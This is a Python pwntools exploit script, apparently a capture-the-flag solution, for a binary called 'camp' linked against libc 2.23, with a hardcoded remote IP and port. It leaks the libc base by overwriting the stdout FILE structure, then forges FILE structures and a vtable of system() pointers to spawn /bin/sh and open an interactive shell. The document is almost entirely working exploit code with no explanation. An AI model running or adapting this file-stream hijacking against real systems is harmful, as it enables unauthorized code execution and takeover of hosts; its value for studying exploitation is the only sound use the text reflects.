#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda x:p.sendline(x)
sd = lambda x:p.send(x)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda x,y:p.sendlineafter(x,y)
rv = lambda x:p.recv(x)
ru = lambda x:p.recvuntil(x)
ia = lambda :p.interactive()

context.log_level = 'debug'

if(sys.argv[1] == 'l'):
	p = process(['./camp'],env={"LD_PRELOAD":"./libc_2.23"})
	elf = ELF("./camp")
	libc = ELF('./libc_2.23')
else:
	p = remote('47.93.204.245',16543)
	elf = ELF("./camp")
	libc = ELF('./libc_2.23')

def menu(cmd):
    sla('>>>\n',str(cmd))

def stdout(size,content):
    menu(1)
    sla('size:\n',str(size))
    sda('content:\n',content)

def stdin(size,content):
    menu(2)
    sla('size:\n',str(size))
    sla('content:\n',content)

def stderr(size,content):
    menu(3)
    sla('size:\n',str(size))
    sla('content:\n',content)

def logs():
    menu(4)

def clear():
    menu(5)

def fclose():
    menu(6)

###leak libc###
payload = p64(0xfbad1887) + p64(0) * 3 + p8(0x58)
stdout(len(payload),payload)

libc_base = u64(ru('\x7f')[-6:].ljust(8,'\x00')) - 0x3c56a3
success('libc base:'+hex(libc_base))
#pause()
###io attack###
system = libc_base + libc.symbols['system']
stderr_address = libc_base + 0x3c5540
success('stderr:'+hex(stderr_address))

payload =  p64(0) * 7 + p64(system) * 8
stderr(len(payload),payload)


payload = '/bin/sh\x00' + p64(libc_base+0x3c56a3) * 7 + p64(libc_base + 0x3c56a4) + p64(0) * 4
payload+= p64(libc_base + 0x3c48e0) + p64(1) + p64(0) + p64(0x00ffffff0aff0001) + p64(libc_base+0x3c6780)
payload+= p64(0xffffffffffffffff) + p64(0) + p64(libc_base+ 0x3c47a0) + p64(0) * 3 + p64(0x00000000ffffffff)
payload+= p64(0) * 2 +  p64(stderr_address)
stdout(len(payload),payload)

#gdb.attach(p)
###get shell###
ia()